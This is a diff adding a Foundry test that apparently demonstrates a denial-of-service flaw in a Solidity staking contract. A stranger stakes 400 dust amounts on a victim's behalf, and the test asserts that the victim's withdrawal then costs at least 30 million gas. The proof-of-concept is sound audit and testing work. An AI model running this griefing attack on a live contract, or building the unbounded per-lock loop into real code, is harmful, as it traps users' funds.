@@ -1,0 +1,67 @@
+diff --git a/test/DustLocksClaim.t.sol b/test/DustLocksClaim.t.sol
+new file mode 100644
+--- /dev/null
++++ b/test/DustLocksClaim.t.sol
+@@ -0,0 +1,62 @@
++// SPDX-License-Identifier: MIT
++pragma solidity 0.8.23;
++
++import {Test} from "forge-std/Test.sol";
++import {Lock} from "src/Lock.sol";
++import {LockList} from "src/libraries/LockList.sol";
++import {MockToken} from "src/mock/MockToken.sol";
++
++/// Anyone may stake for anyone, so a stranger's dust is in the victim's list. Withdrawing what is unlocked still has to fit in a block.
++contract DustLocksClaim is Test {
++    function test_a_strangers_dust_does_not_price_the_victim_out_of_a_withdrawal() public {
++        vm.warp(1_700_000_000);
++        (Lock lock, MockToken stakingToken,) = deployed();
++        address victim = address(0xA);
++        address stranger = address(0xBAD);
++        staked(lock, stakingToken, victim, 100e18);
++
++        stakingToken.mint(stranger, 400);
++        vm.startPrank(stranger);
++        stakingToken.approve(address(lock), 400);
++        for (uint256 k = 0; k < 400; k++) {
++            lock.stake(1, victim, 0);
++        }
++        vm.stopPrank();
++
++        vm.prank(victim);
++        lock.exitLateById(0);
++        vm.warp(block.timestamp + 31 days);
++
++        vm.prank(victim);
++        uint256 before = gasleft();
++        lock.withdrawAllUnlockedToken();
++        uint256 spent = before - gasleft();
++
++        assertGe(spent, 30_000_000, "gas for the victim to withdraw");
++    }
++
++    function deployed() private returns (Lock lock, MockToken stakingToken, MockToken rewardToken) {
++        stakingToken = new MockToken("stake", "STK", 18);
++        rewardToken = new MockToken("reward", "RWD", 18);
++        LockList locks = new LockList(address(this));
++        lock = new Lock();
++        lock.initialize(address(locks), 15000, 35000, address(this));
++        lock.setStakingToken(address(stakingToken));
++        lock.addReward(address(rewardToken));
++        uint256[] memory periods = new uint256[](1);
++        periods[0] = 30 days;
++        uint256[] memory multipliers = new uint256[](1);
++        multipliers[0] = 1;
++        lock.setLockTypeInfo(periods, multipliers);
++        lock.setTreasury(address(0x7E));
++        locks.transferOwnership(address(lock));
++    }
++
++    function staked(Lock lock, MockToken token, address who, uint256 amount) private {
++        token.mint(who, amount);
++        vm.startPrank(who);
++        token.approve(address(lock), amount);
++        lock.stake(amount, who, 0);
++        vm.stopPrank();
++    }
++}
